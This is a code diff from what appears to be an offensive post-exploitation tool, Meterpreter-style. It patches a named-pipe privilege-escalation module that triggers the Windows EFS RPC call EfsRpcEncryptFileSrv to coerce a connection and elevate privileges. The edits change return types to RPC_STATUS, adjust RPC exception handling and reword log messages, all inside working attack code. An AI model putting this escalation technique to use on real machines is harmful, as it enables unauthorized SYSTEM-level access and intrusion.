@@ -4,7 +4,7 @@
 
 typedef NTSTATUS(WINAPI* PRtlGetVersion)(LPOSVERSIONINFOEXW);
 
-DWORD EfsRpcEncryptFileSrv(handle_t binding_h, wchar_t* FileName);
+RPC_STATUS EfsRpcEncryptFileSrv(handle_t binding_h, wchar_t* FileName);
 
 DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName);
 handle_t efs_bind(wchar_t* target);
@@ -109,7 +109,7 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 
 DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
 {
-	DWORD hr = 0;
+	RPC_STATUS hr = 0;
 	LPWSTR pCaptureServer = NULL;
 	handle_t ht = INVALID_HANDLE_VALUE;
 	DWORD dwResult = ERROR_SUCCESS;
@@ -129,7 +129,9 @@ DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
 			}
 			hr = EfsRpcEncryptFileSrv(ht, pCaptureServer);
 		RpcExcept(EXCEPTION_EXECUTE_HANDLER)
-			BREAK_WITH_ERROR("[ELEVATE] trigger_efs_connection: RPC Error", RpcExceptionCode());
+			dprintf("[ELEVATE] trigger_efs_connection: RPC Error: 0x%08x", RpcExceptionCode());
+			dwResult = RPC_S_CALL_FAILED;
+			break;
 		RpcEndExcept
 
 		if (hr == ERROR_BAD_NETPATH) {
@@ -154,9 +156,9 @@ DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
 #define CHECK_RPC_STATUS_AND_RETURN(func, st) {\
 	if (RpcStatus != RPC_S_OK) {\
 		if (DceErrorInqTextA(RpcStatus, RpcError) == RPC_S_OK) {\
-			dprintf("[ELEVATE] efs_bind - Error in %s: 0x%08x - %s", func, RpcStatus, RpcError);\
+			dprintf("[ELEVATE] efs_bind - RPC error in %s: 0x%08x - %s", func, RpcStatus, RpcError);\
 		} else {\
-			dprintf("[ELEVATE] efs_bind - Error in %s: 0x%08x", func, RpcStatus);\
+			dprintf("[ELEVATE] efs_bind - RPC error in %s: 0x%08x", func, RpcStatus);\
 		}\
 		return INVALID_HANDLE_VALUE;\
 	}\
